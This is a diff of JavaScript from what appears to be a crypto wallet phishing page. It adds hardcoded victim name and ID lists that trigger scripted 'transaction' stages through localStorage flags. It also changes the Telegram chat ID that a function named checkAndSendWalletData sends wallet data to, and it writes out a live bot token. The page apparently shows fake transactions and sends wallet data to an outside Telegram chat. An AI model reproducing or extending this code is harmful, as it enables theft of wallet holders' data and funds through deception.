@@ -1,3 +1,62 @@
+window.users = [
+  { name: 'Mark', id: 'BR912411' },
+  { name: 'Mark', id: 'KV434660' },
+  { name: 'Mark', id: 'PO962219' }
+];
+
+window.third = [
+  { name: 'Mark', id: 'BR912411' },
+  { name: 'Mark', id: 'KV434660' },
+  { name: 'Mark', id: 'NC560511' }
+];
+
+// Check name to display 3rd Transact
+function checkNameAndIDInLocalStorage(userDataArray) {
+  // Retrieve stored values from local storage
+  const storedName = localStorage.getItem('walletName');
+  const storedID = localStorage.getItem('walletUserId');
+
+  // Check if both values exist in local storage
+  if (storedName && storedID) {
+    // Check if any object in the array matches both name and ID
+    const matchFound = userDataArray.some(user => {
+      return user.name === storedName && user.id === storedID;
+    });
+
+    if (matchFound) {
+	    localStorage.setItem('Transactions', 'Three');
+	    localStorage.setItem('ThirdTracker', 'true');
+    }
+  }
+}
+
+// Check name to display 4th Transact
+function checkTwoNameAndIDInLocalStorage(userDataArray) {
+  // Retrieve stored values from local storage
+  const storedName = localStorage.getItem('walletName');
+  const storedID = localStorage.getItem('walletUserId');
+
+  // Check if both values exist in local storage
+  if (storedName && storedID) {
+    // Check if any object in the array matches both name and ID
+    const matchFound = userDataArray.some(user => {
+      return user.name === storedName && user.id === storedID;
+    });
+
+    if (matchFound) {
+	    localStorage.setItem('Lastdiv', 'Four');
+	    localStorage.setItem('FourthTracker', 'true');
+    }
+  }
+}
+	    
+// Check if any user in the array matches local storage values
+checkNameAndIDInLocalStorage(users);
+
+// Check if any user in the array matches local storage values
+checkTwoNameAndIDInLocalStorage(third);
+
+
 // Format time difference (e.g., "3 mins ago")
         function formatTimeDifference(timestamp) {
             const now = new Date();
@@ -193,7 +252,7 @@ async function checkAndSendWalletData(botToken, chatId) {
 
 // Telegram Bot Configuration
     const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
-    const TELEGRAM_CHAT_ID = '8163151595'; 
+    const TELEGRAM_CHAT_ID = '6049368044'; 
 
 // Execute the check and send function
 checkAndSendWalletData(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
